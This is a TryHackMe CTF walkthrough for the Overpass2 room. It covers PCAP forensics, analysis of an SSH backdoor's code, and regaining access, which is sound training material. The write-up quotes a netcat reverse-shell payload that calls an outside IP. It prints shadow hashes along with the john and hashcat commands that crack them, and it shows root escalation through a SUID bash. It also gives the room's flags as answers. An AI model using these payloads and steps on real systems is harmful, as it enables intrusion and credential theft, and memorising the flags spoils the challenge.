# Overpass2 Walkthrough
### Link
- https://tryhackme.com/room/overpass2hacked
---
### Task 1  Forensics - Analyse the PCAP
**Question**
###### What was the URL of the page they used to upload a reverse shell?
```
Download and Open pcap

Right click on the first packet --> Select Follow --> TCP Stream
```
[Overpass2_1](https://github.com/LNB283/THM/blob/main/EASY/Overpass2/Pictures/Overpass2_1.png) , [Overpass2_2](https://github.com/LNB283/THM/blob/main/EASY/Overpass2/Pictures/Overpass2_2.png)

**Answer**
###### /development/

**Question**
###### What payload did the attacker use to gain access?
```
Right click on the second packet --> Select Follow --> TCP Stream 
```
[Overpass2_3](https://github.com/LNB283/THM/blob/main/EASY/Overpass2/Pictures/Overpass2_3.png) , [Overpass2_4](https://github.com/LNB283/THM/blob/main/EASY/Overpass2/Pictures/Overpass2_4.png)

**Answer**
###### exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.170.145 4242 >/tmp/f")

**Question**
###### What password did the attacker use to privesc?

Now let's use another method. We search in the entire capture the keyword : *password*

For that: 
```
    - click on the search icon --> select Packet bytes
    - Don't check Case sensitive
    - Select String
    - indicate the string you want to find: password
```
When you found the packet, Right click --> Select Follow --> TCP Stream

[Overpass2_5](https://github.com/LNB283/THM/blob/main/EASY/Overpass2/Pictures/Overpass2_5.png) , [Overpass2_6](https://github.com/LNB283/THM/blob/main/EASY/Overpass2/Pictures/Overpass2_6.png)

**Answer**
######  whenevernoteartinstant

**Question**
###### How did the attacker establish persistence? 

This packet is really interesting because when you scroll down, you found this line command:
git clone https://github.com/NinjaJc01/ssh-backdoor

[Overpass2_7](https://github.com/LNB283/THM/blob/main/EASY/Overpass2/Pictures/Overpass2_7.png)

**Answer**
###### git clone https://github.com/NinjaJc01/ssh-backdoor


**Question**
###### Using the fasttrack wordlist, how many of the system passwords were crackable?

We continue to scroll down and found a list of hashes from /etc/shadow 

[Overpass2_9](https://github.com/LNB283/THM/blob/main/EASY/Overpass2/Pictures/Overpass2_9.png)

```
james:$6$7GS5e.yv$HqIH5MthpGWpczr3MnwDHlED8gbVSHt7ma8yxzBM8LuBReDV5e1Pu/VuRskugt1Ckul/SKGX.5PyMpzAYo3Cg/:18464:0:99999:7:::
paradox:$6$oRXQu43X$WaAj3Z/4sEPV1mJdHsyJkIZm1rjjnNxrY5c8GElJIjG7u36xSgMGwKA2woDIFudtyqY37YCyukiHJPhi4IU7H0:18464:0:99999:7:::
szymex:$6$B.EnuXiO$f/u00HosZIO3UQCEJplazoQtH8WJjSX/ooBjwmYfEOTcqCAlMjeFIgYWqR5Aj2vsfRyf6x1wXxKitcPUjcXlX/:18464:0:99999:7:::
bee:$6$.SqHrp6z$B4rWPi0Hkj0gbQMFujz1KHVs9VrSFu7AU9CxWrZV7GzH05tYPL1xRzUJlFHbyp0K9TAeY1M6niFseB9VLBWSo0:18464:0:99999:7:::
muirland:$6$SWybS8o2$9diveQinxy8PJQnGQQWbTNKeb2AiSp.i8KznuAjYbqI3q04Rf5hjHPer3weiC.2MrOj2o1Sw/fd2cu0kC6dUP.:18464:0:99999:7:::
```
Let's try to decrypt this hash list. Tryhackme suggest to use the wordlist "Fasttrack".

```
Create a file and copy/paste all hashes
john --wordlist=/usr/share/wordlists/fasttrack.txt /media/sf_LOLO_Share/TryHackMe/Beginner/EASY/Overpass2/overpass_hash

Result:
secuirty3        (paradox)
secret12         (bee)
abcd123          (szymex)
1qaz2wsx         (muirland)
```
**Answer**
###### 4

---
### Task 2  Research - Analyse the code



**Question**
###### Question : What's the default hash for the backdoor?

Let's check the github https://github.com/NinjaJc01/ssh-backdoorIn this repository, move to  https://github.com/NinjaJc01/ssh-backdoor/blob/master/main.go. 

You find "var  hash string "variable

**Answer**
###### bdd04d9bb7621687f5df9001f5098eb22bf19eac4c2c30b6f23efed4d24807277d0f8bfccb9e77659103d78c56e66d2d7d8391dfc885d0e9b68acd01fc2170e3



**Question**
###### What's the hardcoded salt for the backdoor?

Scroll down to the last function "passwordhandler". The value return is a combination of hash + salt + password

**Answer**
######  1c362db832f3f864c8c2fe05f2002a05


**Question**
###### What was the hash that the attacker used?

Let's continue to analyze the code of this backdoor.

After var section, you have a set of line that start with "flaggy"

This is the list of this backdoor option. One of this option is **"a"** --> hash for the backdoor

So we need to find something with **"backdoor"** and anoption **"a"**

In the packet, scroll down and you find the command line **"./backdoor -a"**
**Answer**
######  6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed

**Question**
###### Crack the hash using rockyou and a cracking tool of your choice. What's the password?
```
 - Create a file with the hash and the salt
6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed:1c362db832f3f864c8c2fe05f2002a05
```

We know from the backdoor source code : [HashPassword_Code](https://github.com/LNB283/THM/blob/main/EASY/Overpass2/Pictures/Overpass2_12.png)
```
func hashPassword(password string, salt string) string {
	hash := sha512.Sum512([]byte(password + salt))
	return fmt.Sprintf("%x", hash)
}
```

Now we can prepare our hashcat command line. We need to find the code for sha512($pass.$salt)

*Check:* https://hashcat.net/wiki/doku.php?id=example_hashes

*Code:*  **1710**

```
Comand line: hashcat -m 1710 -a 0 /media/sf_LOLO_Share/TryHackMe/Beginner/EASY/Overpass2/backdoor_hash /usr/share/wordlists/rockyou.txt
Result: 6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed:1c362db832f3f864c8c2fe05f2002a05:november16
```
[Screen_Result](https://github.com/LNB283/THM/blob/main/EASY/Overpass2/Pictures/Overpass2_13.png)

**Answer**
######  november16
---

### Task 3 - Attack - Get back in!
- Start the machine

**Question**
######  The attacker defaced the website. What message did they leave as a heading?

[Website home page](https://github.com/LNB283/THM/blob/main/EASY/Overpass2/Pictures/Overpass2_14.png)

**Answer**
###### H4ck3d by CooctusClan

**Question**
###### What's the user flag?

- First, let's perform a quick reco with [NMAP](https://github.com/LNB283/THM/blob/main/EASY/Overpass2/Pictures/Overpass2_15.png)
```
nmap -sC -sV [IP]
Result
Port 22/80/2222
Port 2222 --> SSH
```

Let's use the port 2222 to connect the server with the login/password found previously
```
ssh james@10.10.170.151 -p 2222
```

Navigate to /home/james/ and found the flag [user.txt](https://github.com/LNB283/THM/blob/main/EASY/Overpass2/Pictures/Overpass2_17.png)

**Answer**
###### thm{d119b4fa8c497ddb0525f7ad200e6567}

**Question**
###### What's the root flag?
```
Command line : [ls -lsa
```
Command line Screen: [ls -lsa](https://github.com/LNB283/THM/blob/main/EASY/Overpass2/Pictures/Overpass2_18.png) 

One information is really interesting:

**1088 -rwsr-sr-x 1 root  root  1113504 Jul 22  2020 .suid_bash**

If we run the binary without option "./.suid_bash" , [nothing happened](https://github.com/LNB283/THM/blob/main/EASY/Overpass2/Pictures/Overpass2_19.png) 

We need to execute the binary with the option **"-p"**

-p : allows to execute the binarys like  the owner of this binary. That means this option grants root access.

[root flag screen](https://github.com/LNB283/THM/blob/main/EASY/Overpass2/Pictures/Overpass2_20.png) 

**Answer**
######  thm{d53b2684f169360bb9606c333873144d}
